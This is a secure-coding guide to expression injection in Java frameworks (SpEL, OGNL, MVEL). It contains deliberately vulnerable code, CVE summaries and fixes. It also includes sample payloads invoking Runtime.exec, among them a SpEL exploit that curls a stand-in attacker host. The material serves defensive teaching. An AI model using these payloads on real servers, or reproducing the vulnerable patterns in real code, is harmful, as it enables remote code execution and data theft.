# Expression Injection — SpEL, OGNL, MVEL Injection

## Overview

Java enterprise frameworks extensively use **expression languages** to dynamically evaluate strings as code. Three major expression languages are frequently exploited:

| Language | Framework | Typical Use Case |
|---|---|---|
| **SpEL** (Spring Expression Language) | Spring Framework | Annotation values, XML config, `@Value`, templates |
| **OGNL** (Object-Graph Navigation Language) | Struts 2, MyBatis | WebWork interceptors, type conversion |
| **MVEL** | Various (Drools, JBoss) | Rule engines, config files |

When user input is interpolated into expression strings, attackers can execute arbitrary code on the server. AI-generated Spring/Struts code is the most common source of these vulnerabilities.

## SpEL Injection

### How SpEL Works

SpEL evaluates expressions at runtime. A common pattern:

```java
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression("T(java.lang.Runtime).getRuntime().exec('id')");
// Returns: Process[pid=12345, exitValue="not exited"]
```

### AI-Generated Vulnerability: SpEL in Annotations

```java
// AI-GENERATED — user-controlled SpEL expression
@RestController
public class SpelController {

    @GetMapping("/eval")
    public String evaluate(@RequestParam String expression) {
        // BUG: User input directly as SpEL expression
        ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(expression);
        return exp.getValue().toString(); // RCE!
    }
}
```

**Exploit**: `?expression=T(java.lang.Runtime).getRuntime().exec('curl http://attacker.com/steal')`

### AI-Generated Vulnerability: StandardEvaluationContext

```java
// AI-GENERATED — uses powerful evaluation context
ExpressionParser parser = new SpelExpressionParser();
StandardEvaluationContext ctx = new StandardEvaluationContext(); // TOO POWERFUL!
// This context allows:
// - Type instantiation (T(java.lang.Runtime))
// - Method invocation on any object
// - Access to system properties
Expression exp = parser.parseExpression(userInput);
return exp.getValue(ctx, String.class);
```

**Secure Fix**: Use `SimpleEvaluationContext` which restricts dangerous operations.

```java
// Secure: SimpleEvaluationContext only allows:
// - Property access
// - Map/array access
// - Method calls on root object only (no static methods, no type constructors)
ExpressionParser parser = new SpelExpressionParser();
SimpleEvaluationContext ctx = SimpleEvaluationContext.forReadOnlyDataBinding().build();
Expression exp = parser.parseExpression(expression);
return exp.getValue(ctx, rootObject);
```

## OGNL Injection (Struts 2)

OGNL is infamous for enabling RCE in Apache Struts 2 — the vulnerability behind the **Equifax breach** (2017, CVE-2017-5638).

### AI-Generated Vulnerability: Struts 2 Parameter Injection

```java
// AI-GENERATED — using Struts 2 with user-supplied parameters
// In Struts 2, HTTP parameters are automatically evaluated as OGNL expressions!
// A request parameter: ?user=(class java.lang.Runtime).getRuntime().exec('id')
// Struts evaluates this as OGNL during parameter binding
public class UserAction extends ActionSupport {
    private String user;
    
    public String execute() {
        return SUCCESS;
    }
}
```

### OGNL Vector: CVE-2017-5638 (Equifax)

The vulnerability that compromised Equifax — HTTP `Content-Type` headers containing OGNL expressions were evaluated by Struts 2's multipart parser, achieving unauthenticated RCE.

## MVEL Injection

MVEL evaluates expressions in rule engines:

```java
// AI-GENERATED — MVEL evaluation
String expression = "Runtime.getRuntime().exec(\"calc\")"; // User controlled
Object result = MVEL.eval(expression); // RCE!
```

**Secure Fix**: Use MVEL's `ParserContext` to restrict operations.
```java
ParserContext ctx = new ParserContext();
ctx.setAllowNestedAccess(false);     // Block nested property access
ctx.setAllowTypeConversion(false);   // Block type coercion
```

## Spring Cloud Gateway SpEL Injection (CVE-2022-22947)

Spring Cloud Gateway's Actuator API evaluated SpEL expressions from user requests.

## Real CVEs

- **CVE-2024-38808 (Spring SpEL)**: CVSS 4.3 — a crafted SpEL expression causes a **denial of service** (not RCE) in Spring Framework's `spring-expression` module. Applications are exposed only when they evaluate user-supplied SpEL.
- **CVE-2022-22965 (Spring4Shell)**: CVSS 9.8 — Spring Core RCE via class injection.
- **CVE-2022-22947 (Spring Cloud Gateway)**: CVSS 10.0 — SpEL injection in the Gateway Actuator API (scope-changed, unauthenticated RCE).
- **CVE-2017-5638 (Struts 2 OGNL)**: CVSS 10.0 — OGNL injection that led to the Equifax breach.

## Prevention Checklist

1. **Never evaluate user input as SpEL/OGNL/MVEL** — There is almost no legitimate reason to do so.
2. **Use `SimpleEvaluationContext` for SpEL** — Not `StandardEvaluationContext`, which allows RCE.
3. **Avoid `@Value` with user-controllable placeholders** — Use `@Value` only with hardcoded property names.
4. **Update Struts 2 to latest** — Struts 2 has had >10 OGNL CVEs.
5. **Restrict MVEL `ParserContext`** — Disable type conversion and nested access.
6. **Run DAST scans** — Tools like OWASP ZAP detect expression injection.
